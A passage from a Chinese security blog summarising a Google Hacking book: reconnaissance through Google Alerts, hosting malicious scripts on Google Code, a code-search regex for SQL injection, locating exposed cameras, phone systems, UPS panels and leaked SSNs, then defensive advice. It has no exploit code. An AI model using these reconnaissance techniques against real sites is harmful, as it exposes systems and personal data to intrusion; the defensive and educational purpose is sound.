<li>Blogger时Google的博客软件，它位于blogger。com和blogspot。com之上。Blogger是使用得最广泛的博客之一。他允许多个博客实时创建，并且具有一些与其他软件合作并且避免注释和引用垃圾博客的功能</li>
<li>Splog的搜索引擎的排名在不断地提升，所以他会吸引更多的访问者。如果攻击者拿下了Web浏览器的Splog页面上的漏洞应用的话，他就应该在瞬间接管上百台机器</li>
</ul>
<p>  <strong>10.4 信号报警</strong></p>
<ul>
<li>google alerts是一个强大的工具，可以用来发觉查询结果合适变化。该系统可以被修改为每天或者每周都发送更新，亦或者是有更新时发送更新</li>
<li>这是一个很出色的工具，它还可以用于更有趣的目的。假设、我们知道目标服务器使用Mysql作为数据库终端。我们可以使用Google Alerts 来查询目标，并且在出现错误时搜索错误信息</li>
<li>为警报类型选择Web—通常这是默认的选项。选项警报的频率以及你的E-mail地址并且单击Create Alert（创建警报）</li>
<li>恶意用户可以使用该服务来警示目标站点上出现的漏洞和有趣信息。这个警示的配置非常低，并不会让目标有所警惕，该业务发生在用户和Google之间。攻击者甚至可以碰到Google Hacking Database中所有条目的警报。</li>
</ul>
<p>  <strong>10.5 Google Co-op</strong></p>
<ul>
<li>Google Co-op（<a target="_blank" rel="noopener" href="http://www.google.com/coop）是一个非常强大的服务，允许你创建一个强大的自定义搜索引擎。你不需要为了使用该服务而注册为Google用户，但是如果你需要创建一个引擎，则需要注册">www.google.com/coop）是一个非常强大的服务，允许你创建一个强大的自定义搜索引擎。你不需要为了使用该服务而注册为Google用户，但是如果你需要创建一个引擎，则需要注册</a></li>
</ul>
<p>  <strong>10.6 Google Code</strong></p>
<ul>
<li>Google Code是对允许提供全免费项目的开源代码社区的最大的恩惠。在功能方面，该服务与很多人都知道的Sourceforge十分相似。通过SVN，为研发者提供了Wiki来寄存项目文档、Bug跟踪体系以及版本控制</li>
<li>Google Code不只是一个开发环境，他还是一个免费的寄存提供者。我们可以使用该系统来隐藏此处的所有信息</li>
</ul>
<p>  <strong>10.6.1 SVN简介</strong></p>
<p>  <strong>10.6.2 在线获取文件</strong></p>
<ul>
<li>一旦你的项目提交到源库中，你便可以在线访问它的内容。你可以通过访问<a target="_blank" rel="noopener" href="http://projectname.googlecode.com/svn/trunk来获取提交的项目。记住，提交的文件可以作为内容形式的文件/明码或者内容形式的应用程序/八位字节流使用，这样一来便可以防止它们在浏览器中被解析。这意味着，理论上，你应该能查看/预览上传的图片或者HTML文件">http://projectname.googlecode.com/svn/trunk来获取提交的项目。记住，提交的文件可以作为内容形式的文件/明码或者内容形式的应用程序/八位字节流使用，这样一来便可以防止它们在浏览器中被解析。这意味着，理论上，你应该能查看/预览上传的图片或者HTML文件</a></li>
<li>尽管这样，攻击者扔旧可以寄存恶意脚本，该脚本可以利用带有漏洞的浏览器，允许系统控制访问者的浏览器。这正是我们着手查看Google Code开发平台真正潜力的入口。没有任何东西可以防止攻击者在线寄存他们的恶意文件，防止攻击者使用它们来攻击无辜的人。因为ISP（互联网服务提供商）不能完全地组织Google来停止恶意传播，所以这种情况很值得关注。很多用户的处境都不容乐观</li>
<li>哪些熟悉IDS（侵入检测系统）和IPS（侵入预防系统）的人之所以会反对是因为恶意软件也可以通过将签名设置为可以在流行防火墙产品以及诸如Snort之类的开发源项目中找到的签名来查找。因为Google Code的加密选项，在绝大多数时间，攻击者都不会被察觉。正如我们知道的，加密通信能确保隐私的安全。Google为寄存的项目提供了SSL连接</li>
</ul>
<p>  <strong>10.6.3 查找代码</strong></p>
<ul>
<li><p>我们还可以用Google Code来查询代码，用一些正则表达式来精确的搜索一些我们想要的阿东西</p>
</li>
<li><p>例如查找SQL注入漏洞：</p>
<p>mysql_query.*?_GET lang:php</p>
</li>
<li><p>该查询以关键字mysql_query开头——mysql_query是PHP里的标准函数。接着，我们使用.*?序列查找未定义的字符数。最后，在查找HTTP GET参数的关键字_GET。通常，我们查找的SQL查询由$_GET控制。对基于$_POST的SQL注入攻击应用也可以采用相似的策略。记住，本章的实例仅是我们可以进行测试的实例的一小部分变体。Google Code Search是一个非常有用的可以在很多语种中查找漏洞的工具</p>
</li>
</ul>
<p>  <strong>10.7 一些想法</strong></p>
<ul>
<li>我们可以使用Google Code Search在我们自己的项目中查找字符串。如果我们有一个巨大的数据集要分析，我们可以简单地将它上传到代码中，并且等待Google机器人程序将它找出来。接着，我们可以使用标准的正则表达式查询来查找我们最感兴趣的数据</li>
<li>对于一些工具我们可以根据他的源码和一些反应来自己创立一个属于自己的工具来做一些自己想做的事情</li>
</ul>
<p>  <strong>第十一章 Google Hacking案例</strong></p>
<p>  <strong>11.1 简介</strong></p>
<ul>
<li>Google 黑客会花上好几个小时在互联网上查找丰富的资源。通过一轮又一轮的搜索，他们会因找到清晰易读的，有意义的的搜索而欣喜若狂。之所以我了解这些是因为我亲眼目睹了这一过程。具有创造力的Google搜索可以泄露医药、金融、所有权甚至是机密信息。尽管政府颁布了法令、规章及保护法案，诸如HIPPA，且不断设置安全装置，这一问题仍然存在。信息仍会驱使网络中这一问题的发生，而这正好被Google黑客逮个正着</li>
</ul>
<p>  <strong>11.2 低级信息</strong></p>
<ul>
<li>我们将要一同来看一下由Google黑客揭秘的一些更有趣的技术。我们将从查看多种确实无关的、除非你的目标是帮助黑客的工具着手进行。接着，我们将要查看开放的网络设备，并且打开应用程序，它们都不涉及任何真正的可以使用的攻击</li>
</ul>
<p>  <strong>11.2.1 工具</strong></p>
<ul>
<li>任何黑客都有一个由他自行支配的工具基金，但是本节奏要探讨的该工具的有趣部分是：它们是在线的——它们在网络服务器上运行，且允许黑客有效地试探对该网络服务器的搜索。</li>
<li>与ping工具不同，finger工具已经很久没有投入使用了。这一烦人的服务允许攻击者查询UNIX机器上的用户，允许枚举各种信息，如用户连接时间、起始目录、全名以及其他的信息</li>
</ul>
<p>  <strong>11.2.2 开放的网络设备</strong></p>
<ul>
<li>对于所有在网络上开放和管理的网络设备你都可以去了解和控制</li>
<li>例如比较多的像摄像头，饮水机，打印机，自能手表等多种设备</li>
</ul>
<p>  <strong>11.2.3 开放的应用程序</strong></p>
<ul>
<li>相对而言，很多主流的Web应用程序都是傻子认证，它们是专门为那些对安全了解甚少而只懂点击操作的大部分人设计的。更重要的是Google攻击社区已经发现了成千上万个开放的在线应用程序，只需等待一个点击操作的脚本的出现并拥有它们即可</li>
<li>通常可以简单的去发现和控制一些网站甚至是一些服务器</li>
</ul>
<p>  <strong>11.3 摄像头</strong></p>
<ul>
<li>曾有一段时间，GHDB的所有附件就只有网络摄像头查询。尽管如此，有些网络摄像头查询。尽管如此，有些网络摄像头搜索还是十分有趣的。</li>
</ul>
<p>  <strong>11.4 电话设备</strong></p>
<ul>
<li>有些网络设备映射的网络暴露的大量的电话信息</li>
<li>有的管理系统甚至语序网络访问这连接会议电话、断开会议电话连接及监控会议电话，为与会者抓取快照，甚至是更改line(线路设置)，恶意的黑客甚至会更改系统名和密码，锁定合法管理者使其无法进入自己的系统</li>
</ul>
<p>  <strong>11.5 电源</strong></p>
<ul>
<li>当谈及使用Google攻击电源时，很多人都会感到怀疑。大多数人肯定在想是说UPS系统，对于网络上的一些有网络管理页面的系统来说都可以解决掉</li>
</ul>
<p>  <strong>11.6 敏感信息</strong></p>
<ul>
<li>敏感信息对于一些日志，文档，警务信息等都会泄露出大量的信息</li>
</ul>
<p>  <strong>11.7 社保号码</strong></p>
<ul>
<li>社保号码（SSN）是美国公民拥有的最敏感的信息。即使一个外行的罪犯也可以使用一个被到的SSN来开设一个银行账号，设置信用卡的最高限额以及其他的信息，所有均是以受害人的名义进行的。</li>
<li>对于一些Google泄露的信息来说大部分是攻击者从钓鱼网站上得来的</li>
</ul>
<p>  <strong>11.8 Google之外的信息</strong></p>
<ul>
<li>在某些情况下，Google都是长长的攻击链中的第一步。通过别的一些信息来获取到一些敏感的信息</li>
</ul>
<p>  <strong>11.9 总结</strong></p>
<ul>
<li>本章的所有内容都是关于Google攻击威胁被忽略后可能导致的严重错误。不论你何时身处严重的威胁都可以参看本章内容。请帮助传播这一信息，并且成为解决方案的一本而非问题的一本分。在想Google发送暂停或终止文件之前，记住——如果你的敏感数据使它成为在线内容，那么就不是Google的错了</li>
</ul>
<p>  <strong>第十二章 防卫Google黑客</strong></p>
<p>  <strong>12.1 简介</strong></p>
<ul>
<li>这本书的目的是在于帮助你理解Google黑客在攻击时可能采取的手段，这样你就能合理地保护自己和你的客户免于遭受这种似乎没有危险的威胁的侵害</li>
</ul>
<p>  <strong>12.2 完善且坚固的安全策略</strong></p>
<ul>
<li>应该把强制执行的，坚固的安全策略作为所有安全保障措施的基础</li>
<li>如果没有策略，那么你的安全防卫可能就会无效或者无法强制执行</li>
</ul>
<p>  <strong>12.3 Web服务器安全防护</strong></p>
<ul>
<li>目录列表、错误消息和不当的配置能提供大量信息</li>
<li>Robots.txt文件和特殊的META标记可以阻止搜索引擎Crawler访问特定的页面或目录</li>
<li>即使时最基本的口令机制都能阻止crawler访问受保护的内容</li>
<li>默认的页面和设置表明该服务器没有很好地维护而且会让该服务器成为黑客的一个目标</li>
</ul>
<p>  <strong>12.4 攻击你的站点</strong></p>
<ul>
<li>使用site操作符来浏览你负责保护的服务器，警惕任何不属于公开信息的页面</li>
<li>使用想Gooscan、Athena、GSI、Google Rower或者Advanced Dork这样的工具来评估你的网站的信息泄露情况。这些工具不使用Google API，所以要知道任何滥用或者过分的行为都会导致Google封掉你的IP段</li>
<li>使用像Wikto这样的工具也能攻击你的站点，而且这些工具使用了Google API，不会担心会被Google惩罚</li>
<li>利用Google hacking DATabase来跟踪最新的Google hacking查询。把GHDB和Gooscan、Athena或者Wikto这样的工具结合起来使用</li>
</ul>
<p>  <strong>12.5 从Google获取帮助</strong></p>
<ul>
<li>使用Google的Webmaster页面获取特殊的信息</li>
<li>使用Google的URL删除工具从Google数据库中删除敏感的数据</li>
</ul>
<p>  <strong>12.6 网站链接</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://johnny.ihackstuff.com">http://johnny.ihackstuff.com</a> （GHDB），搜索引擎hacking论坛，Gooscan工具和GHDB导出文件的主页</li>
<li><a target="_blank" rel="noopener" href="http://www.snakeoillabs.com">www.snakeoillabs.com</a>    Athena的主页</li>
<li><a target="_blank" rel="noopener" href="http://www.seorank.com/robots-tutorial.htm">http://www.seorank.com/robots-tutorial.htm</a>    使用robots.txt文件的优秀指南</li>
<li><a target="_blank" rel="noopener" href="http://www.sensepost.com/research/aura">www.sensepost.com/research/aura</a>          Sensepost的AURA,它可以模拟Google的SOAP API调用</li>
<li><a target="_blank" rel="noopener" href="http://www.tankedgenius.com">http://www.tankedgenius.com</a>        JeffBall的Cp的GSI以及Google Rower工具的主页</li>
<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firfox/addon/2144">https://addons.mozilla.org/en-US/firfox/addon/2144</a>    Cp的Advanced Dork的主页</li>
</ul>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Google-Hacking/">Google-Hacking </a></div></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="ol4three"></figure><p class="title is-size-4 is-block line-height-inherit">ol4three</p><p class="is-size-6 is-block">醒来时世界都远了，我需要最狂的风，和最静的海。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">84</p></a></div></div><a class="level-item has-text-centered is-marginless" href="/categories"><div><p class="heading">Categories</p><div><p class="title">9</p></div></div></a><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">77</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ol4three" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ol4three"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://118.25.15.216:8080/login" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Java-sec-code</span></span><span class="level-right"><span class="level-item tag">118.25.15.216</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://b0urne.top" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">B0urne</span></span><span class="level-right"><span class="level-item tag">b0urne.top</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://xcniao.ol4three.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Xcniao</span></span><span class="level-right"><span class="level-item tag">xcniao.ol4three.com</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://tengxiaofei.run" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Tengxiaofei</span></span><span class="level-right"><span class="level-item tag">tengxiaofei.run</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://lalalaxiaoyuren.github.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">smail_fish</span></span><span class="level-right"><span class="level-item tag">lalalaxiaoyuren.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://vinadiakt.github.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">vinadiak</span></span><span class="level-right"><span class="level-item tag">vinadiakt.github.io</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/IOT/"><span class="level-start"><span class="level-item">IOT</span></span><span class="level-end"><span class="level-item tag">22</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">WEB安全</span></span><span class="level-end"><span class="level-item tag">35</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">二进制安全</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">内网渗透</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"><span class="level-start"><span class="level-item">协议分析</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><span class="level-start"><span class="level-item">环境配置</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"><span class="level-start"><span class="level-item">路由器</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2021-01-04T15:02:15.000Z">2021-01-04</time></p><p class="title is-6"><a class="link-muted" href="/2021/01/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme4/">crackme-系列之-crackme4</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-12-30T01:55:25.000Z">2020-12-30</time></p><p class="title is-6"><a class="link-muted" href="/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/">2020 最新渗透测试⾯试题合集</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-12-29T11:34:42.000Z">2020-12-29</time></p><p class="title is-6"><a class="link-muted" href="/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Apereo Cas 4.1.x 反序列化命令执行漏洞</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-12-29T03:57:33.000Z">2020-12-29</time></p><p class="title is-6"><a class="link-muted" href="/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/">使用Httpdecrypt进行hook</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-12-28T08:00:24.000Z">2020-12-28</time></p><p class="title is-6"><a class="link-muted" href="/2020/12/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme3/">crackme-系列之-crackme3</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/360/"><span class="tag">360</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AWD/"><span class="tag">AWD</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ActiveMQ/"><span class="tag">ActiveMQ</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Amazon/"><span class="tag">Amazon</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apache/"><span class="tag">Apache</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apache-Cocoon-XML/"><span class="tag">Apache-Cocoon-XML</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apereo-Cas/"><span class="tag">Apereo Cas</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppWeb/"><span class="tag">AppWeb</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apple-T2/"><span class="tag">Apple T2</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BLE/"><span class="tag">BLE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BadUsb/"><span class="tag">BadUsb</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cisco/"><span class="tag">Cisco</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/DMA/"><span class="tag">DMA</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Drozer/"><span class="tag">Drozer</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/EDR/"><span class="tag">EDR</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exchange-Server/"><span class="tag">Exchange-Server</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Frida/"><span class="tag">Frida</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Google-Hacking/"><span class="tag">Google-Hacking</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8D%8F%E8%AE%AE/"><span class="tag">HTTP请求走私协议</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hook/"><span class="tag">Hook</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Horde-Groupware-Webmail-Edition/"><span class="tag">Horde Groupware Webmail Edition</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Httpdecrypt/"><span class="tag">Httpdecrypt</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Huawei/"><span class="tag">Huawei</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOT/"><span class="tag">IOT</span><span class="tag is-grey-lightest">17</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JCG/"><span class="tag">JCG</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MSF/"><span class="tag">MSF</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mybatis/"><span class="tag">Mybatis</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mysql-python/"><span class="tag">Mysql-python</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/NC/"><span class="tag">NC</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP%E7%BD%91%E7%AB%99/"><span class="tag">PHP网站</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PhpStudy/"><span class="tag">PhpStudy</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Pligg/"><span class="tag">Pligg</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PowerSploit/"><span class="tag">PowerSploit</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Pwn/"><span class="tag">Pwn</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SDK/"><span class="tag">SDK</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SGX/"><span class="tag">SGX</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQLI-labs/"><span class="tag">SQLI-labs</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQL注入</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Sql%E6%B3%A8%E5%85%A5/"><span class="tag">Sql注入</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Thunderbolt-3/"><span class="tag">Thunderbolt 3</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Ubertooth-one/"><span class="tag">Ubertooth one</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/VIM/"><span class="tag">VIM</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/VPN/"><span class="tag">VPN</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XiaoMi/"><span class="tag">XiaoMi</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ZTE/"><span class="tag">ZTE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crackme/"><span class="tag">crackme</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crunch/"><span class="tag">crunch</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/icarus/"><span class="tag">icarus</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iot/"><span class="tag">iot</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">java反序列化</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"><span class="tag">nginx解析漏洞</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sangfor/"><span class="tag">sangfor</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/scrcpy/"><span class="tag">scrcpy</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql%E6%B3%A8%E5%85%A5/"><span class="tag">sql注入</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/struts2/"><span class="tag">struts2</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%B8%89%E6%98%9F/"><span class="tag">三星</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"><span class="tag">代理转发</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="tag">内网渗透</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"><span class="tag">协议分析</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"><span class="tag">后渗透</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A0%86/"><span class="tag">堆</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%A9%E8%9E%8D%E4%BF%A1/"><span class="tag">天融信</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"><span class="tag">宏病毒</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AE%9D%E5%A1%94/"><span class="tag">宝塔</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"><span class="tag">未授权访问漏洞</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B3%9B%E5%BE%AEOA/"><span class="tag">泛微OA</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%94%A8%E5%8F%8B/"><span class="tag">用友</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"><span class="tag">红队百科全书</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BB%BF%E7%9B%9F/"><span class="tag">绿盟</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%93%9D%E7%89%99/"><span class="tag">蓝牙</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"><span class="tag">路由器</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%80%9A%E8%BE%BEOA/"><span class="tag">通达OA</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9D%A2%E8%AF%95/"><span class="tag">面试</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" 